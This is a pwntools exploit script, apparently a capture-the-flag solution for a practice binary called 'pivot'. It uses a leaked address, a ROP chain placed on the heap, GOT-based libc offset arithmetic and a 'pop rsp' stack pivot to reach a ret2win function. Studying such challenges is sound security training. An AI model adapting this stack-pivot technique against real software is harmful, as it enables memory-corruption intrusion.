from pwn import *

elf = ELF('./pivot')
libc = ELF('./libpivot.so', checksec=False)
io = elf.process()

pause()

io.recvuntil(b"pivot: ")
leak = int(io.recvline(), 16)
log.success(f"leak is: {hex(leak)}")

io.recvuntil(b"> ")

heap = b""
heap += b"A"* 8
heap += b"B"* 8
heap += b"C"* 8
heap += p64(elf.plt['foothold_function'])
heap += p64(0x00000000004009bb) # : pop rax ; ret
heap += p64(elf.got['foothold_function'])
heap += p64(0x00000000004009c0) # : mov rax, qword ptr [rax] ; ret
heap += p64(0x00000000004007c8) # : pop rbp ; ret
heap += p64(libc.sym['ret2win'] - libc.sym['foothold_function'])
heap += p64(0x00000000004009c4) # : add rax, rbp ; ret
heap += p64(0x00000000004007c1) # : jmp rax | call rax both get the job done

io.sendline(heap)

#----------------------------------------------------------------
io.recvuntil(b"> ")
stack = b"A" * 40
stack += p64(0x0000000000400a2d) # : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
stack += p64(leak)


io.sendline(stack)



io.interactive()
